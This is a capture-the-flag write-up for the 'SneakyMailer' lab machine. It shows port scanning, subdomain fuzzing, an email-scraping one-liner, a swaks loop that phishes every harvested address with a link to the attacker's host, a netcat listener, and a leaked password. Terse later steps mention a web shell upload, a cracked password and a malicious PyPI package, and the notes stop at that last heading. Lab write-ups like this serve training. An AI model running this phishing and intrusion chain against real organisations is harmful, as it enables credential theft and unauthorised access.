# SneakyMailer

## Enumeration

### Scan Report

```text
PORT     STATE SERVICE  VERSION
21/tcp   open  ftp      vsftpd 3.0.3
22/tcp   open  ssh      OpenSSH 7.9p1 Debian 10+deb10u2 (protocol 2.0)
25/tcp   open  smtp     Postfix smtpd
80/tcp   open  http     nginx 1.14.2
143/tcp  open  imap     Courier Imapd (released 2018)
993/tcp  open  ssl/imap Courier Imapd (released 2018)
8080/tcp open  http     nginx 1.14.2
Service Info: Host:  debian; OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel
```

### Port 21

vsftpd 3.0.3 -&gt; no vulnerabilites found on internet

### Port 80

It redirects us to [http://sneakycorp.htb/](http://sneakycorp.htb/) so, add this domain in hosts file

### Fuzz Subdomains

```text
❯ sudo wfuzz -c -f sub-fighter -w /home/dhruv/PenetrationTesting/SecLists/Discovery/DNS/subdomains-top1million-5000.txt -u "http://sneakycorp.htb" -H "Host: FUZZ.sneakycorp.htb" --hw 12
```

![](../../../.gitbook/assets/image%20%2847%29.png)

Add dev.sneakycorp.htb to hosts file and browse to it

## Exploitation

### Move users email addresses to a file

Filter emails from file

```text
gawk  -v RS='[[:alnum:]_.]+@[[:alnum:]_]+[.][[:alnum:]]+' 'RT{print RT}' team > emailaddresses
```

### Sending mails to users

We don't know whether susers will click on mails or not. So, lets verify it first rather than creating a phishing page.

```text
for email in $(cat emailaddresses);
do
	echo  email
	swaks \
		--from support@sneakymailer.htb \
		--to $email \
		--header 'Subject: Please Register your account' \
		--body 'http://10.10.14.12/register.php' \
		--server 10.10.10.197
done
```

This will start sending out emails. Listen on another port.

```text
nc -nvlkp 80
```

This will show messages if user clicks the link



You will get the reply

![](../../../.gitbook/assets/image%20%2839%29.png)

### Use this in Evolution

You will get an email with username and password

```text
Hello administrator, I want to change this password for the developer account
 
Username: developer
Original-Password: m^AsY7vTKVT+dV1{WOU%@NaHkUAId3]C
 
Please notify me when you do it
```



### FTP 

Upload shell!

## Post Exploitation

### .Htaccess returns a password

Location: /var/www/pypi.sneakycorp.htb

Crack and find password: soufianeelhaoui



### Read sites-available

```text
cat /etc/nginx/sites-available/pypo.sneakycorp.htb
```



### Create ,malicious pypi package to execut and gain shell

